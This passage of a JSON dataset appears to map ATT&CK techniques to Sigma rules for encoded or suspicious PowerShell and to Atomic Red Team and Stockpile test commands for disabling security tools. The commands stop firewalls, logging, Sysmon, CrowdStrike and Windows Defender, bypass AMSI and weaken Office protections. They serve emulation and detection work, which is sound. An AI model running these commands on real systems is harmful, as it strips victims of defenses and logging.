"https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/lib/modules/powershell/persistence/powerbreach/deaduser.py#L191", "https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/lib/modules/powershell/persistence/powerbreach/resolver.py#L178", "https://github.com/EmpireProject/Empire/blob/e37fb2eef8ff8f5a0a689f1589f424906fe13055/data/module_source/privesc/Invoke-EventVwrBypass.ps1#L64"], "author": "Florian Roth", "date": "2019/04/20", "tags": ["attack.execution", "attack.t1086"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine": ["* -NoP -sta -NonI -W Hidden -Enc *", "* -noP -sta -w 1 -enc *", "* -NoP -NonI -W Hidden -enc *"]}, "condition": "selection"}, "level": "critical"}}, {"data_source": {"title": "Suspicious Encoded PowerShell Command Line", "id": "ca2092a1-c273-4878-9b4b-0d60115bf5ea", "description": "Detects suspicious powershell process starts with base64 encoded commands", "status": "experimental", "references": ["https://app.any.run/tasks/6217d77d-3189-4db2-a957-8ab239f3e01e"], "author": "Florian Roth, Markus Neis", "date": "2018/09/03", "modified": "2019/07/30", "tags": ["attack.execution", "attack.t1086"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine": ["* -e JAB*", "* -e  JAB*", "* -e   JAB*", "* -e    JAB*", "* -e     JAB*", "* -e      JAB*", "* -enc JAB*", "* -enco JAB*", "* -encodedcommand JAB*", "* BA^J e-", "* -e SUVYI*", "* -e aWV4I*", "* -e SQBFAFgA*", "* -e aQBlAHgA*", "* -enc SUVYI*", "* -enc aWV4I*", "* -enc SQBFAFgA*", "* -enc aQBlAHgA*"]}, "falsepositive1": {"CommandLine": "* -ExecutionPolicy remotesigned *"}, "condition": "selection and not falsepositive1"}, "level": "high"}}, {"data_source": {"title": "Malicious Base64 encoded PowerShell Keywords in command lines", "id": "f26c6093-6f14-4b12-800f-0fcb46f5ffd0", "status": "experimental", "description": "Detects base64 encoded strings used in hidden malicious PowerShell command lines", "references": ["http://www.leeholmes.com/blog/2017/09/21/searching-for-content-in-base-64-strings/"], "tags": ["attack.execution", "attack.t1086"], "author": "John Lambert (rule)", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"encoded": {"Image": "*\\powershell.exe", "CommandLine": "* hidden *"}, "selection": {"CommandLine": ["*AGkAdABzAGEAZABtAGkAbgAgAC8AdAByAGEAbgBzAGYAZQByA*", "*aXRzYWRtaW4gL3RyYW5zZmVy*", "*IAaQB0AHMAYQBkAG0AaQBuACAALwB0AHIAYQBuAHMAZgBlAHIA*", "*JpdHNhZG1pbiAvdHJhbnNmZX*", "*YgBpAHQAcwBhAGQAbQBpAG4AIAAvAHQAcgBhAG4AcwBmAGUAcg*", "*Yml0c2FkbWluIC90cmFuc2Zlc*", "*AGMAaAB1AG4AawBfAHMAaQB6AGUA*", "*JABjAGgAdQBuAGsAXwBzAGkAegBlA*", "*JGNodW5rX3Npem*", "*QAYwBoAHUAbgBrAF8AcwBpAHoAZQ*", "*RjaHVua19zaXpl*", "*Y2h1bmtfc2l6Z*", "*AE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4A*", "*kATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8Abg*", "*lPLkNvbXByZXNzaW9u*", "*SQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuA*", "*SU8uQ29tcHJlc3Npb2*", "*Ty5Db21wcmVzc2lvb*", "*AE8ALgBNAGUAbQBvAHIAeQBTAHQAcgBlAGEAbQ*", "*kATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtA*", "*lPLk1lbW9yeVN0cmVhb*", "*SQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0A*", "*SU8uTWVtb3J5U3RyZWFt*", "*Ty5NZW1vcnlTdHJlYW*", "*4ARwBlAHQAQwBoAHUAbgBrA*", "*5HZXRDaHVua*", "*AEcAZQB0AEMAaAB1AG4Aaw*", "*LgBHAGUAdABDAGgAdQBuAGsA*", "*LkdldENodW5r*", "*R2V0Q2h1bm*", "*AEgAUgBFAEEARABfAEkATgBGAE8ANgA0A*", "*QASABSAEUAQQBEAF8ASQBOAEYATwA2ADQA*", "*RIUkVBRF9JTkZPNj*", "*SFJFQURfSU5GTzY0*", "*VABIAFIARQBBAEQAXwBJAE4ARgBPADYANA*", "*VEhSRUFEX0lORk82N*", "*AHIAZQBhAHQAZQBSAGUAbQBvAHQAZQBUAGgAcgBlAGEAZA*", "*cmVhdGVSZW1vdGVUaHJlYW*", "*MAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkA*", "*NyZWF0ZVJlbW90ZVRocmVhZ*", "*Q3JlYXRlUmVtb3RlVGhyZWFk*", "*QwByAGUAYQB0AGUAUgBlAG0AbwB0AGUAVABoAHIAZQBhAGQA*", "*0AZQBtAG0AbwB2AGUA*", "*1lbW1vdm*", "*AGUAbQBtAG8AdgBlA*", "*bQBlAG0AbQBvAHYAZQ*", "*bWVtbW92Z*", "*ZW1tb3Zl*"]}, "condition": "encoded and selection"}, "falsepositives": ["Penetration tests"], "level": "high"}}, {"data_source": {"title": "Suspicious PowerShell Invocation based on Parent Process", "id": "95eadcb2-92e4-4ed1-9031-92547773a6db", "status": "experimental", "description": "Detects suspicious powershell invocations from interpreters or unusual programs", "author": "Florian Roth", "references": ["https://www.carbonblack.com/2017/03/15/attackers-leverage-excel-powershell-dns-latest-non-malware-attack/"], "tags": ["attack.execution", "attack.t1086"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"ParentImage": ["*\\wscript.exe", "*\\cscript.exe"], "Image": ["*\\powershell.exe"]}, "falsepositive": {"CurrentDirectory": "*\\Health Service State\\\\*"}, "condition": "selection and not falsepositive"}, "fields": ["CommandLine", "ParentCommandLine"], "falsepositives": ["Microsoft Operations Manager (MOM)", "Other scripts"], "level": "medium"}}, {"data_source": {"title": "PowerShell Script Run in AppData", "id": "ac175779-025a-4f12-98b0-acdaeb77ea85", "status": "experimental", "description": "Detects a suspicious command line execution that invokes PowerShell with reference to an AppData folder", "references": ["https://twitter.com/JohnLaTwC/status/1082851155481288706", "https://app.any.run/tasks/f87f1c4e-47e2-4c46-9cf4-31454c06ce03"], "tags": ["attack.execution", "attack.t1086"], "author": "Florian Roth", "date": "2019/01/09", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine": ["* /c powershell*\\AppData\\Local\\\\*", "* /c powershell*\\AppData\\Roaming\\\\*"]}, "condition": "selection"}, "falsepositives": ["Administrative scripts"], "level": "medium"}}]}, {"technique_id": "T1089", "commands": [{"source": "atomics/T1089/T1089.yaml", "command": "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"6\" ];\nthen\n  service iptables stop\n  chkconfig off iptables\n  service ip6tables stop\n  chkconfig off ip6tables\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"7\" ];\n  systemctl stop firewalld\n  systemctl disable firewalld\nfi\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"6\" ];\nthen\n  service rsyslog stop\n  chkconfig off rsyslog\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"7\" ];\n  systemctl stop rsyslog\n  systemctl disable rsyslog\nfi\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"6\" ];\nthen\n  service cbdaemon stop\n  chkconfig off cbdaemon\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"7\" ];\n  systemctl stop cbdaemon\n  systemctl disable cbdaemon\nfi\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "setenforce 0\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "sudo systemctl stop falcon-sensor.service\nsudo systemctl disable falcon-sensor.service\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "sudo launchctl unload /Library/LaunchDaemons/com.crowdstrike.falcond.plist\nsudo launchctl unload #{userdaemon_plist}\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "sudo launchctl unload #{falcond_plist}\nsudo launchctl unload /Library/LaunchDaemons/com.crowdstrike.userdaemon.plist\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "fltmc.exe unload SysmonDrv\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"Default Web Site\" /section:httplogging /dontLog:true\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "sysmon -u\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "Remove-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -Recurse\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "net.exe stop McAfeeDLPAgentService\nsc.exe config McAfeeDLPAgentService start= disabled\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "Set-MpPreference -DisableRealtimeMonitoring 1\nSet-MpPreference -DisableBehaviorMonitoring 1\nSet-MpPreference -DisableScriptScanning 1\nSet-MpPreference -DisableBlockAtFirstSeen 1\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "sc stop WinDefend\nsc config WinDefend start=disabled\nsc query WinDefend\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 1\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "New-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\"\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\"\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableInternetFilesInPV\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableUnsafeLocationsInPV\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableAttachementsInPV\" -Value \"1\" -PropertyType \"Dword\"\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "Stop-Service -Name McAfeeDLPAgentService\nRemove-Service -Name McAfeeDLPAgentService\n", "name": null}, {"source": "atomics/T1089/T1089.yaml", "command": "if (Test-Path \"C:\\ProgramData\\Package Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe\") {. \"C:\\ProgramData\\Package Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe\" /repair /uninstall /quiet } else { Get-ChildItem -Path \"C:\\ProgramData\\Package Cache\" -Include \"WindowsSensor.exe\" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath $_.FullName); if ($sig.Status -eq \"Valid\" -and $sig.SignerCertificate.DnsNameList -eq \"CrowdStrike, Inc.\") { . \"$_\" /repair /uninstall /quiet; break;}}}", "name": null}, {"source": "data/abilities/defense-evasion/49470433-30ce-4714-a44b-bea9dbbeca9a.yml", "command": {"windows": {"psh": {"command": "Set-MPPreference -DisableRealtimeMonitoring 1\n", "cleanup": "Set-MPPreference -DisableRealtimeMonitoring 0"}}}, "name": "Disable Windows Defender Real-Time Protection"}, {"source": "data/abilities/defense-evasion/b007f6e8-4a87-4440-8888-29ceab047d9b.yml", "command": {"windows": {"psh": {"command": "Set-MpPreference -DisableIntrusionPreventionSystem $true;\nSet-MpPreference -DisableIOAVProtection $true;\nSet-MpPreference -DisableRealtimeMonitoring $true;\nSet-MpPreference -DisableScriptScanning $true;\nSet-MpPreference -EnableControlledFolderAccess Disabled;\n", "cleanup": "Set-MpPreference -DisableIntrusionPreventionSystem $false;\nSet-MpPreference -DisableIOAVProtection $false;\nSet-MpPreference -DisableRealtimeMonitoring $false;\nSet-MpPreference -DisableScriptScanning $false;\nSet-MpPreference -EnableControlledFolderAccess Enabled;\n"}}}, "name": "Disable Windows Defender All"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/disable_rdp", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/management/disable_rdp", "name": "Empire Module Command"}], "parsed_datasets": [{"Atomic Red Team Test - Disabling Security Tools": {"attack_technique": "T1089", "display_name": "Disabling Security Tools", "atomic_tests": [{"name": "Disable iptables firewall", "description": "Disables the iptables firewall\n", "supported_platforms": ["linux"], "executor": {"name": "sh", "command": "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"6\" ];\nthen\n  service iptables stop\n  chkconfig off iptables\n  service ip6tables stop\n  chkconfig off ip6tables\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"7\" ];\n  systemctl stop firewalld\n  systemctl disable firewalld\nfi\n"}}, {"name": "Disable syslog", "description": "Disables syslog collection\n", "supported_platforms": ["linux"], "executor": {"name": "sh", "command": "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"6\" ];\nthen\n  service rsyslog stop\n  chkconfig off rsyslog\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"7\" ];\n  systemctl stop rsyslog\n  systemctl disable rsyslog\nfi\n"}}, {"name": "Disable Cb Response", "description": "Disable the Cb Response service\n", "supported_platforms": ["linux"], "executor": {"name": "sh", "command": "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"6\" ];\nthen\n  service cbdaemon stop\n  chkconfig off cbdaemon\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"7\" ];\n  systemctl stop cbdaemon\n  systemctl disable cbdaemon\nfi\n"}}, {"name": "Disable SELinux", "description": "Disables SELinux enforcement\n", "supported_platforms": ["linux"], "executor": {"name": "sh", "command": "setenforce 0\n"}}, {"name": "Stop Crowdstrike Falcon on Linux", "description": "Stop and disable Crowdstrike Falcon on Linux\n", "supported_platforms": ["linux"], "executor": {"name": "sh", "elevation_required": true, "command": "sudo systemctl stop falcon-sensor.service\nsudo systemctl disable falcon-sensor.service\n", "cleanup_command": "sudo systemctl enable falcon-sensor.service\nsudo systemctl start falcon-sensor.service\n"}}, {"name": "Disable Carbon Black Response", "description": "Disables Carbon Black Response\n", "supported_platforms": ["macos"], "executor": {"name": "sh", "command": "sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist\n"}}, {"name": "Disable LittleSnitch", "description": "Disables LittleSnitch\n", "supported_platforms": ["macos"], "executor": {"name": "sh", "command": "sudo launchctl unload /Library/LaunchDaemons/at.obdev.littlesnitchd.plist\n"}}, {"name": "Disable OpenDNS Umbrella", "description": "Disables OpenDNS Umbrella\n", "supported_platforms": ["macos"], "executor": {"name": "sh", "command": "sudo launchctl unload /Library/LaunchDaemons/com.opendns.osx.RoamingClientConfigUpdater.plist\n"}}, {"name": "Stop and unload Crowdstrike Falcon on macOS", "description": "Stop and unload Crowdstrike Falcon daemons falcond and userdaemon on macOS\n", "supported_platforms": ["macos"], "input_arguments": {"falcond_plist": {"description": "The path of the Crowdstrike Falcon plist file", "type": "path", "default": "/Library/LaunchDaemons/com.crowdstrike.falcond.plist"}, "userdaemon_plist": {"description": "The path of the Crowdstrike Userdaemon plist file", "type": "path", "default": "/Library/LaunchDaemons/com.crowdstrike.userdaemon.plist"}}, "executor": {"name": "sh", "elevation_required": true, "command": "sudo launchctl unload #{falcond_plist}\nsudo launchctl unload #{userdaemon_plist}\n"}}, {"name": "Unload Sysmon Filter Driver", "description": "Unloads the Sysinternals Sysmon filter driver without stopping the Sysmon service. To verify successful execution, o verify successful execution,\nrun the prereq_command's and it should fail with an error of \"sysmon filter must be loaded\".\n", "supported_platforms": ["windows"], "input_arguments": {"sysmon_driver": {"description": "The name of the Sysmon filter driver (this can change from the default)", "type": "string", "default": "SysmonDrv"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Sysmon must be downloaded\n", "prereq_command": "if ((cmd.exe /c \"where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul\") -or (Test-Path $env:Temp\\Sysmon\\Sysmon.exe)) { exit 0 } else { exit 1 }\n", "get_prereq_command": "Invoke-WebRequest \"https://download.sysinternals.com/files/Sysmon.zip\" -OutFile \"$env:TEMP\\Sysmon.zip\"\nExpand-Archive $env:TEMP\\Sysmon.zip $env:TEMP\\Sysmon -Force\nRemove-Item $env:TEMP\\Sysmon.zip -Force\n"}, {"description": "sysmon must be Installed\n", "prereq_command": "if(sc.exe query sysmon | findstr sysmon) { exit 0 } else { exit 1 }\n", "get_prereq_command": "if(cmd.exe /c \"where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul\") { C:\\Windows\\Sysmon.exe -accepteula -i } else\n{ Set-Location $env:TEMP\\Sysmon\\; .\\Sysmon.exe -accepteula -i}\n"}, {"description": "sysmon filter must be loaded\n", "prereq_command": "if(fltmc.exe filters | findstr #{sysmon_driver}) { exit 0 } else { exit 1 }\n", "get_prereq_command": "sysmon -u\nsysmon -accepteula -i\n"}], "executor": {"name": "command_prompt", "elevation_required": true, "prereq_command": "fltmc.exe filters | findstr #{sysmon_driver}\n", "command": "fltmc.exe unload #{sysmon_driver}\n", "cleanup_command": "sysmon -u -i > nul 2>&1\nsysmon -i -accepteula -i > nul 2>&1\n%temp%\\Sysmon\\sysmon.exe -u > nul 2>&1\n%temp%\\Sysmon\\sysmon.exe -accepteula -i > nul 2>&1\n"}}, {"name": "Disable Windows IIS HTTP Logging", "description": "Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).\nThis action requires HTTP logging configurations in IIS to be unlocked.\n", "supported_platforms": ["windows"], "input_arguments": {"website_name": {"description": "The name of the website on a server", "type": "string", "default": "Default Web Site"}}, "executor": {"name": "powershell", "prereq_command": "if(Test-Path C:\\Windows\\System32\\inetsrv\\appcmd.exe) {exit 0} else {exit 1}\n", "command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"#{website_name}\" /section:httplogging /dontLog:true\n", "cleanup_command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"#{website_name}\" /section:httplogging /dontLog:false\n"}}, {"name": "Uninstall Sysmon", "description": "Uninstall Sysinternals Sysmon for Defense Evasion\n", "supported_platforms": ["windows"], "input_arguments": {"sysmon_exe": {"description": "The location of the Sysmon executable from Sysinternals (ignored if sysmon.exe is found in your PATH)", "type": "Path", "default": "PathToAtomicsFolder\\T1089\\bin\\sysmon.exe"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Sysmon executable must be available\n", "prereq_command": "if(cmd /c where sysmon) {exit 0} else {exit 1}\n", "get_prereq_command": "$parentpath = Split-Path \"#{sysmon_exe}\"; $zippath = \"$parentpath\\Sysmon.zip\"\nNew-Item -ItemType Directory $parentpath -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/Sysmon.zip\" -OutFile \"$zippath\"\nExpand-Archive $zippath $parentpath -Force; Remove-Item $zippath\nif(-not ($Env:Path).contains($parentpath)){$Env:Path += \";$parentpath\"}\n"}, {"description": "Sysmon must be installed\n", "prereq_command": "if(cmd /c sc query sysmon) { exit 0} else { exit 1}\n", "get_prereq_command": "cmd /c sysmon -i -accepteula\n"}], "executor": {"name": "command_prompt", "elevation_required": true, "command": "sysmon -u\n", "cleanup_command": "sysmon -i -accepteula >nul 2>&1\n"}}, {"name": "AMSI Bypass - AMSI InitFailed", "description": "Any easy way to bypass AMSI inspection is it patch the dll in memory setting the \"amsiInitFailed\" function to true.\nUpon execution, no output is displayed.\n\nhttps://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n", "cleanup_command": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)\n"}}, {"name": "AMSI Bypass - Remove AMSI Provider Reg Key", "description": "With administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\\Software\\Microsoft\\AMSI to disable AMSI inspection.\nThis test removes the Windows Defender provider registry key. Upon execution, no output is displayed.\nOpen Registry Editor and navigate to \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\\" to verify that it is gone.\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": true, "command": "Remove-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\\{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -Recurse\n", "cleanup_command": "New-Item -Path \"HKLM:\\SOFTWARE\\Microsoft\\AMSI\\Providers\" -Name \"{2781761E-28E0-4109-99FE-B9D127C57AFE}\" -ErrorAction Ignore | Out-Null\n"}}, {"name": "Disable Arbitrary Security Windows Service", "description": "With administrative rights, an adversary can disable Windows Services related to security products. This test requires McAfeeDLPAgentService to be installed.\nChange the service_name input argument for your AV solution. Upon exeuction, infomration will be displayed stating the status of the service.\nTo verify that the service has stopped, run \"sc query McAfeeDLPAgentService\"\n", "supported_platforms": ["windows"], "input_arguments": {"service_name": {"description": "The name of the service to stop", "type": "String", "default": "McAfeeDLPAgentService"}}, "executor": {"name": "command_prompt", "elevation_required": true, "command": "net.exe stop #{service_name}\nsc.exe config #{service_name} start= disabled\n", "cleanup_command": "sc.exe config #{service_name} start= auto >nul 2>&1\nnet.exe start #{service_name} >nul 2>&1\n"}}, {"name": "Tamper with Windows Defender ATP PowerShell", "description": "Attempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled\nin Windows settings.\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": true, "command": "Set-MpPreference -DisableRealtimeMonitoring 1\nSet-MpPreference -DisableBehaviorMonitoring 1\nSet-MpPreference -DisableScriptScanning 1\nSet-MpPreference -DisableBlockAtFirstSeen 1\n", "cleanup_command": "Set-MpPreference -DisableRealtimeMonitoring 0\nSet-MpPreference -DisableBehaviorMonitoring 0\nSet-MpPreference -DisableScriptScanning 0\nSet-MpPreference -DisableBlockAtFirstSeen 0\n"}}, {"name": "Tamper with Windows Defender Command Prompt", "description": "Attempting to disable scheduled scanning and other parts of windows defender atp. These commands must be run as System, so they still fail as administrator.\nHowever, adversaries do attempt to perform this action so monitoring for these command lines can help alert to other bad things going on. Upon execution, \"Access Denied\"\nwill be displayed twice and the WinDefend service status will be displayed.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": true, "command": "sc stop WinDefend\nsc config WinDefend start=disabled\nsc query WinDefend\n", "cleanup_command": "sc start WinDefend >nul 2>&1\nsc config WinDefend start=enabled >nul 2>&1\n"}}, {"name": "Tamper with Windows Defender Registry", "description": "Disable Windows Defender from starting after a reboot. Upen execution, if the computer is rebooted the entire Virus and Threat protection window in Settings will be\ngrayed out and have no info.\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": true, "command": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 1\n", "cleanup_command": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 0\n"}}, {"name": "Disable Microft Office Security Features", "description": "Gorgon group may disable Office security features so that their code can run. Upon execution, an external document will not\nshow any warning before editing the document.\n\n\nhttps://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "New-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\"\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\"\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableInternetFilesInPV\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableUnsafeLocationsInPV\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableAttachementsInPV\" -Value \"1\" -PropertyType \"Dword\"\n", "cleanup_command": "Remove-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\"\nRemove-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\"\n"}}, {"name": "Remove Windows Defender Definition Files", "description": "Removing definition files would cause ATP to not fire for AntiMalware. Check MpCmdRun.exe man page for info on all arguments.\nOn later viersions of windows (1909+) this command fails even with admin due to inusfficient privelages. On older versions of windows the\ncommand will say completed.\n\nhttps://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": true, "command": "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All\n"}}, {"name": "Stop and Remove Arbitrary Security Windows Service", "description": "Beginning with Powershell 6.0, the Stop-Service cmdlet sends a stop message to the Windows Service Controller for each of the specified services. The Remove-Service cmdlet removes a Windows service in the registry and in the service database.\n", "supported_platforms": ["windows"], "input_arguments": {"service_name": {"description": "The name of the service to remove", "type": "String", "default": "McAfeeDLPAgentService"}}, "executor": {"name": "powershell", "elevation_required": true, "command": "Stop-Service -Name #{service_name}\nRemove-Service -Name #{service_name}\n"}}, {"name": "Uninstall Crowdstrike Falcon on Windows", "description": "Uninstall Crowdstrike Falcon. If the WindowsSensor.exe path is not provided as an argument we need to search for it. Since the executable is located in a folder named with a random guid we need to identify it before invoking the uninstaller.\n", "supported_platforms": ["windows"], "input_arguments": {"falcond_path": {"description": "The Crowdstrike Windows Sensor path. The Guid always changes.", "type": "path", "default": "C:\\ProgramData\\Package Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe"}}, "executor": {"name": "powershell", "elevation_required": true, "command": "if (Test-Path \"#{falcond_path}\") {. \"#{falcond_path}\" /repair /uninstall /quiet } else { Get-ChildItem -Path \"C:\\ProgramData\\Package Cache\" -Include \"WindowsSensor.exe\" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath $_.FullName); if ($sig.Status -eq \"Valid\" -and $sig.SignerCertificate.DnsNameList -eq \"CrowdStrike, Inc.\") { . \"$_\" /repair /uninstall /quiet; break;}}}"}}]}}, {"Mitre Stockpile - Disable Windows Defender Real-Time Protection": {"id": "49470433-30ce-4714-a44b-bea9dbbeca9a", "name": "Disable Windows Defender Real-Time Protection", "description": "Disable Windows Defender Real-Time Protection", "tactic": "defense-evasion", "technique": {"attack_id": "T1089", "name": "Disabling Security Tools"}, "privilege": "Elevated", "platforms": {"windows": {"psh": {"command": "Set-MPPreference -DisableRealtimeMonitoring 1\n", "cleanup": "Set-MPPreference -DisableRealtimeMonitoring 0"}}}}}, {"Mitre Stockpile - Disable Windows Defender All": {"id": "b007f6e8-4a87-4440-8888-29ceab047d9b", "name": "Disable Windows Defender All", "description": "Disable Windows Defender All", "tactic": "defense-evasion", "technique": {"attack_id": "T1089", "name": "Disabling Security Tools"}, "platforms": {"windows": {"psh": {"command": "Set-MpPreference -DisableIntrusionPreventionSystem $true;\nSet-MpPreference -DisableIOAVProtection $true;\nSet-MpPreference -DisableRealtimeMonitoring $true;\nSet-MpPreference -DisableScriptScanning $true;\nSet-MpPreference -EnableControlledFolderAccess Disabled;\n", "cleanup": "Set-MpPreference -DisableIntrusionPreventionSystem $false;\nSet-MpPreference -DisableIOAVProtection $false;\nSet-MpPreference -DisableRealtimeMonitoring 